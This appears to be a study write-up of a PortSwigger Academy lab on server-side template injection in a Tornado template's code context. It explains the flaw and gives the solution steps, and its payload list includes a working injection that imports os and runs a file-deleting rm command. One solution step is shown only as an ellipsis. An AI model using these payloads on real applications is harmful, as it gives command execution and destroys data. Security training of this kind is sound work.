# Lab: Basic server-side template injection (code context)

**Official lab:** [Lab: Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

**Lab idea:** This challenge uses an unsafe Tornado template in a preferred-name feature, where a value is incorporated into template code context. It practices recognizing the difference between data and template syntax in a user-controlled field and using the engine's documentation to assess the risk.

## Vulnerability in brief
Server-side template injection (SSTI) is a vulnerability in which untrusted input is interpreted as template-language syntax and evaluated by a server-side template engine. Template engines normally combine fixed templates with changing data to render pages. The vulnerability arises when applications construct template source by concatenating user input into it instead of supplying that input strictly as data. This may happen accidentally through unsafe template design or intentionally when an application permits users to submit or modify templates.

## Solution idea
1. While proxying traffic through Burp, log in and post a comment on one of the blog posts.
2. Notice that on the "My account" page, you can select whether you want the site to use your full name, first name, or nickname.
3. In Burp, go to "Proxy" > "HTTP history" and find the request that sets this parameter, namely POST /my-account/change-blog-post-author-display , and send it to Burp Repeater.
4. Study the Tornado documentation to discover that template expressions are surrounded with double curly braces, such as {{someExpression}} .
- …
6. Combine this knowledge to construct a payload that deletes Carlos's file: {% import os %} {{os.system('rm /home/carlos/morale.txt')
7. In Burp Repeater, go back to POST /my-account/change-blog-post-author-display .
8. Reload the page containing your comment to execute the template and solve the lab.

## Payloads / key values
- `POST`
- `blog-post-author-display`
- `user.name`
- `user.first_name`
- `user.nickname`
- `POST /my-account/change-blog-post-author-display`
- `{{someExpression}}`
- `blog-post-author-display=user.name}}{{7*7}}`
- `Peter Wiener49}}`
- `{% somePython %}`
- `os`
- `system()`
- `{% import os %} {{os.system('rm /home/carlos/morale.txt')`
- `blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')`

## Official source
- [PortSwigger Academy: Lab: Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)
